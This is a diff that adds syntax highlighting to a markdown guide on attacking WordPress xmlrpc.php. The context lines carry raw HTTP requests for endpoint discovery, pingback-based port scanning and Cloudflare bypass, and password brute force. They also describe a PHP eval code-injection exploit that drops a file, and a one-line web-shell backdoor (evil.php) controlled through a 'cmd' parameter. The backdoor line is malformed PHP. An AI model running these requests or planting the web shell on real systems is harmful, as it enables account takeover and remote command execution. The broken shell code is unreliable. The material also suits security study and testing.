@@ -10,7 +10,7 @@ Exploiting the xmlrpc.php
 ## Searching for XML-RPC servers on WordPress :
 - Post Method :
   
-  ```
+  ```xml
   POST /xmlrpc.php HTTP/1.1
   Host: example.com
   Content-Length: 135
@@ -24,7 +24,7 @@ Exploiting the xmlrpc.php
 
 - The normal response should be :
 
-  ```
+  ```xml
     HTTP/1.1 200 OK
     Date: Mon, 01 Jul 2019 17:13:30 GMT
     Server: Apache
@@ -64,7 +64,7 @@ Exploiting the xmlrpc.php
 1. Cloudflare Protection Bypass (find real server ip)<br>
 1. XSPA (Cross Site Port Attack)<br>
 
-```
+```xml
 POST /xmlrpc.php HTTP/1.1
 Host: example.com
 Content-Length: 303
@@ -84,7 +84,7 @@ Content-Length: 303
 ```
 
 response :
-```
+```xml
 HTTP/1.1 200 OK
 Date: Mon, 01 Jul 2019 21:53:56 GMT
 Server: Apache
@@ -115,7 +115,7 @@ Content-Type: text/xml; charset=UTF-8
 ```
 <br><br>
 ## Brute force attacks
-```
+```xml
 POST /xmlrpc.php HTTP/1.1
 Host: example.com
 Content-Length: 1560
@@ -135,7 +135,7 @@ Content-Length: 1560
 ```
 
 response :
-```
+```xml
 HTTP/1.1 200 OK
 Date: Mon, 01 Jul 2019 23:02:55 GMT
 Server: Apache
@@ -196,7 +196,7 @@ XML-RPC for PHP is affected by a remote code-injection vulnerability. Pear XML_R
  Exploit : 
 > The attacker sends the below XML data in the HTTP POST to the vulnerable server. The XML element <name> contains the PHP command injection. XML-RPC will pass the XML elements to PHP eval() without validating the user input. Upon execution, PHP command drops a malicious script to the tmp directory & modifies the file permission to allow execution.
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <methodCall>
   <methodName>test.method</methodName>
@@ -211,8 +211,11 @@ XML-RPC for PHP is affected by a remote code-injection vulnerability. Pear XML_R
 
 ```
 <sub>xml data with PHP command injection</sub>
-<br>
-evil.php -> `<?php system($_GET['cmd'];)?>`
+<br><br>
+evil.php :
+```php
+<?php system($_GET['cmd'];)?>
+```
   
 <br>
 The uploaded malicious php can be a backdoor. It allows the  attacker to execute malicious shell commands by sending a GET request to http://target.com/evil.php?cmd=ls
